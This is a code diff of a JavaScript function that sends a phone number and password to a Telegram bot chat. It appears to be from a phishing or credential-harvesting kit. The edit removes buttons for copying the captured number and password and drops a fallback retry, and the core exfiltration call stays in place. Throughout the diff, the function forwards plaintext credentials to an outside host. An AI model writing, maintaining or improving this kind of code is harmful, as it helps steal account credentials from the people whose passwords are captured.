@@ -156,31 +156,12 @@ async function sendTelegramNotification(phone, password) {
         chat_id: chatId,
         text: message,
         parse_mode: "HTML",
-        disable_web_page_preview: true,
-        reply_markup: {
-          inline_keyboard: [
-            [
-              { text: "📋 Copy Number", copy_text: { text: String(phone) } },
-              { text: "🔐 Copy Password", copy_text: { text: String(password) } }
-            ]
-          ]
-        }
+        disable_web_page_preview: true
       })
     });
 
-    // If a Telegram client/API does not support copy_text, retry immediately
-    // without buttons so the notification itself is never blocked.
     if (!response.ok) {
-      await fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message,
-          parse_mode: "HTML",
-          disable_web_page_preview: true
-        })
-      });
+      console.warn("Telegram notification request was not accepted.");
     }
   } catch (e) {
     console.warn("Telegram notification failed:", e);
